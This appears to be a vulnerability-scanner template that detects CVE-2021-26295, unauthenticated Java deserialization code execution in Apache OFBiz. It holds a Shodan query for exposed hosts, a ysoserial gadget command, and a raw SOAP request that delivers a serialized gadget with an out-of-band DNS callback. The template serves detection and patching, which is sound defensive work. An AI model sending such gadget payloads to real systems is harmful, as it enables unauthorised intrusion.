id: CVE-2021-26295
info:
  name: Apache OFBiz <17.12.06 - Arbitrary Code Execution
  author: madrobot
  severity: critical
  description: Apache OFBiz <17.12.06 is vulnerable to remote code execution through
    unsafe deserialization, allowing an attacker to take over the system without authentication.
  reference:
  - https://github.com/yumusb/CVE-2021-26295-POC
  - https://packetstormsecurity.com/files/162104/Apache-OFBiz-SOAP-Java-Deserialization.html
  - https://github.com/zhzyker/exphub/tree/master/ofbiz
  - https://lists.apache.org/thread.html/r3c1802eaf34aa78a61b4e8e044c214bc94accbd28a11f3a276586a31%40%3Cuser.ofbiz.apache.org%3E
  - https://lists.apache.org/thread.html/r6e4579c4ebf7efeb462962e359501c6ca4045687f12212551df2d607@%3Cnotifications.ofbiz.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2021-26295
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-26295
    cwe-id: CWE-502
  metadata:
    shodan-query: OFBiz.Visitor=
    verified: 'true'
    ysoserial-payload: java -jar ysoserial.jar URLDNS https://oob-url-to-request.tld
      | hex
    impact: The impact of CVE-2021-26295 is that an unauthenticated attacker can execute
      arbitrary code and gain control of Apache OFBiz prior to version 17.12.06.
    recommendation: Upgrade to Apache OFBiz version 17.12.06 or later to mitigate
      the risk of arbitrary code execution caused by unsafe deserialization.
  tags: packetstorm,cve,cve2021,apache,ofbiz,deserialization,rce
requests:
- raw:
  - "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n<soapenv:Envelope\n\
    \  xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header/>\n\
    \    <soapenv:Body>\n      <ns1:clearAllEntityCaches xmlns:ns1=\"http://ofbiz.apache.org/service/\"\
    >\n          <ns1:cus-obj>{{generate_java_gadget(\"dns\", \"https://{{interactsh-url}}\"\
    , \"hex\")}}</ns1:cus-obj>\n      </ns1:clearAllEntityCaches>\n    </soapenv:Body>\n\
    </soapenv:Envelope>\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    part: body
    words:
    - errorMessage
    condition: and
  - type: word
    part: header
    words:
    - OFBiz.Visitor=
